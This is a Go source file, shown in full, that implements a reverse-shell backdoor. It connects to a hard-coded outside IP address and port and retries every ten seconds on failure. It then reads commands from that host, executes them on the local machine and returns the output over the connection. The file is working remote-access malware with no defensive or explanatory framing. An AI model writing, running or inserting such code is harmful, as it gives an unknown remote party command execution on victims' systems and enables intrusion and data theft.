package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

func main() {
	conn, err := net.Dial("tcp", "62.210.122.76:8569")
	if err != nil {
		time.Sleep(10 * time.Second)
		main()
	}
	defer conn.Close()
	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')
		opts := []string{}
		defldo := strings.Split(strings.TrimSuffix(message, "\n"), " ")
		if len(defldo) > 1 {
			opts = defldo[1:]
			message = defldo[0]
		} else {
			message = strings.Join(defldo, "")
		}
		command := exec.Command(message, opts...)
		out, err := command.Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		out = append(out, '°')
		fmt.Fprintf(conn, "%s\n", out)
	}
}
